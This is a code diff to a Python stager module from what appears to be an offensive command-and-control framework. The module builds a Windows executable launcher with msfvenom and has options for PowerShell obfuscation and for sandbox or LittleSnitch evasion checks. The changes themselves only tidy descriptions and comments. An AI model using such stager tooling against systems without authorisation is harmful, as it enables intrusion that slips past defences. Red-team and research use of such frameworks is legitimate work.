@@ -18,7 +18,7 @@ class Stager:
                 }
             ],
             "Description": "Generates windows command executable using msfvenom to act as a stage 0.",
-            "Comments": [""],
+            "Comments": [],
         }
 
         self.options = {
@@ -45,7 +45,7 @@ class Stager:
                 "Value": "launcher.exe",
             },
             "Obfuscate": {
-                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                 "Required": False,
                 "Value": "False",
                 "SuggestedValues": ["True", "False"],
@@ -57,7 +57,7 @@ class Stager:
                 "Value": r"Token\All\1",
             },
             "SafeChecks": {
-                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
+                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
@@ -101,7 +101,6 @@ class Stager:
         self.main_menu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         obfuscate = self.options["Obfuscate"]["Value"]
@@ -169,9 +168,7 @@ class Stager:
         elif arch == "x86":
             msf_payload = "windows/exec"
 
-        # generate the msfvenom command
         msf_command = f'msfvenom -p {msf_payload} -f {msf_format} CMD="{launcher}"'
 
-        # Run the command and get output
         print(f"[*] MSF command -> {msf_command}")
         return subprocess.check_output(msf_command, shell=True)
